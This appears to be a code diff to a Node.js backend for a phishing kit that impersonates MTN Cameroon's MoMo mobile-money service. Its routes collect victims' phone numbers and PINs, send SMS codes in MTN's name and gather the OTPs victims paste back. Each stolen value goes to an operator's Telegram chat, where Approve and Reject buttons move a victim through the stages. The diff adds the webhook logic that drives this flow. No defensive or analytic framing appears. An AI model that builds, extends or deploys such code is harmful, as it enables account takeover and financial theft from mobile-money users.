@@ -19,23 +19,20 @@ const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
 const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
 
 // ============ IN-MEMORY STORE ============
-const applications = {};      // appId -> application object
+const applications = {};
 
 // ============ HELPERS ============
 function generateId() {
   return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
 }
 
-function generateCode(len = 4) {
+function generateCode(len = 6) {
   return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
 }
 
 async function sendTelegramMessage(text, buttons = null) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-  const body = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: text
-  };
+  const body = { chat_id: TELEGRAM_CHAT_ID, text };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   try {
     await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
@@ -54,14 +51,8 @@ async function sendSms(to, text) {
     return;
   }
   try {
-    await axios.post(`${SMS_GATEWAY_URL}/sms`, {
-      to,
-      text
-    }, {
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': SMS_GATEWAY_API_KEY
-      }
+    await axios.post(`${SMS_GATEWAY_URL}/sms`, { to, text }, {
+      headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_GATEWAY_API_KEY }
     });
   } catch (e) {
     console.error('SMS send error:', e.message);
@@ -70,20 +61,16 @@ async function sendSms(to, text) {
 
 // ============ ROUTES ============
 
-// Health check
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-// VERIFY PIN – called by frontend when user submits phone + PIN
+// VERIFY PIN
 app.post('/api/verify-pin', async (req, res) => {
   const { phoneNumber, pin } = req.body;
-  if (!phoneNumber || !pin) {
-    return res.status(400).json({ success: false, message: 'Missing required fields' });
-  }
+  if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Missing required fields' });
 
   const appId = generateId();
   applications[appId] = {
-    phoneNumber,
-    pin,
+    phoneNumber, pin,
     pinStatus: 'pending',
     smsStatus: 'pending',
     otpStatus: 'pending',
@@ -98,11 +85,9 @@ app.post('/api/verify-pin', async (req, res) => {
     { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId }) }
   ]];
   await sendTelegramMessage(message, buttons);
-
   res.json({ success: true, applicationId: appId });
 });
 
-// CHECK PIN STATUS
 app.get('/api/check-pin-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
@@ -117,8 +102,7 @@ app.post('/api/resend-sms', async (req, res) => {
 
   const newCode = generateCode(6);
   app.smsCode = newCode;
-  const smsText = `Your MTN MoMo verification code is: ${newCode}`;
-  await sendSms(`+237${app.phoneNumber}`, smsText);
+  await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${newCode}`);
 
   const message = `🔄 *SMS RESENT*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew SMS code: ${newCode}\n\nPlease verify the SMS message the user will paste.`;
   const buttons = [[
@@ -126,8 +110,7 @@ app.post('/api/resend-sms', async (req, res) => {
     { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
   ]];
   await sendTelegramMessage(message, buttons);
-
-  res.json({ success: true, message: 'SMS resent' });
+  res.json({ success: true });
 });
 
 // VERIFY SMS
@@ -136,8 +119,8 @@ app.post('/api/verify-sms', async (req, res) => {
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
 
-  const extractedCode = (smsMessage.match(/\d{6}/) || [])[0];
-  if (!extractedCode || extractedCode !== app.smsCode) {
+  const extracted = (smsMessage.match(/\d{6}/) || [])[0];
+  if (!extracted || extracted !== app.smsCode) {
     return res.json({ success: false, message: 'SMS code does not match. Please try again.' });
   }
 
@@ -148,11 +131,10 @@ app.post('/api/verify-sms', async (req, res) => {
     { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
   ]];
   await sendTelegramMessage(message, buttons);
-
   res.json({ success: true });
 });
 
-// CHECK OTP STATUS (also used for SMS approval)
+// CHECK STATUS (used for both SMS and OTP stages)
 app.get('/api/check-otp-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
@@ -188,21 +170,57 @@ app.post('/api/verify-otp', async (req, res) => {
     { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
   ]];
   await sendTelegramMessage(message, buttons);
-
   res.json({ success: true });
 });
 
-// ============ TELEGRAM WEBHOOK ============
+// TELEGRAM WEBHOOK
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
 
   if (update.callback_query) {
     const query = update.callback_query;
     let data;
-    try {
-      data = JSON.parse(query.data);
-    } catch (e) {
-      return res.sendStatus(200);
+    try { data = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }
+
+    const { a, step, appId } = data;
+    const app = applications[appId];
+    if (!app) return res.sendStatus(200);
+
+    if (step === 'PIN') {
+      app.pinStatus = a === 'APPROVE' ? 'approved' : 'rejected';
+      if (app.pinStatus === 'approved') {
+        const smsCode = generateCode(6);
+        app.smsCode = smsCode;
+        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${smsCode}`);
+      }
+    } else if (step === 'SMS') {
+      app.smsStatus = a === 'APPROVE' ? 'approved' : 'rejected';
+      if (app.smsStatus === 'approved') {
+        const otpCode = generateCode(4);
+        app.otpCode = otpCode;
+        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo OTP is: ${otpCode}`);
+      }
+    } else if (step === 'OTP') {
+      app.otpStatus = a === 'APPROVE' ? 'approved' : 'rejected';
     }
 
-    const { a, step,
+    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
+    });
+
+    return res.sendStatus(200);
+  }
+
+  res.sendStatus(200);
+});
+
+// Serve frontend
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
+});
